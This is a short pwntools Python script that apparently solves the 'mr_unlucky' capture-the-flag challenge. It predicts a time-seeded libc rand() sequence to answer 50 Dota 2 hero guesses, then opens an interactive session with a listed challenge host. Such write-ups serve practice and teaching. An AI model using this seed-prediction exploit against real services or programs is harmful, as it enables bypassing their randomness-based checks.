#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL

# =========================================================
#                          SETUP                         
# =========================================================
exe = './mr_unlucky_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = CDLL("./libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "52.59.124.14", 5021


def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

heroes_list = [
    "Anti-Mage",
    "Axe",
    "Bane",
    "Bloodseeker",
    "Crystal Maiden",
    "Drow Ranger",
    "Earthshaker",
    "Juggernaut",
    "Mirana",
    "Morphling",
    "Phantom Assassin",
    "Pudge",
    "Shadow Fiend",
    "Sniper",
    "Storm Spirit",
    "Sven",
    "Tiny",
    "Vengeful Spirit",
    "Windranger",
    "Zeus"
]

def heroes():
    idx = libc.rand() % 0x14
    return heroes_list[idx]

def exploit():
    global io
    io = initialize()
    io.recvuntil("YET I CAN\'T BEAT IT\'S CHALLENGE. Can you help me guess the names?")
    if args.REMOTE:
       libc.srand(libc.time(None) + 3)
    else:
       libc.srand(libc.time(None))
    for i in range(50):
        io.sendlineafter("Guess the Dota 2 hero (case sensitive!!!): ", heroes())
    io.interactive()
    
if __name__ == '__main__':
    exploit()
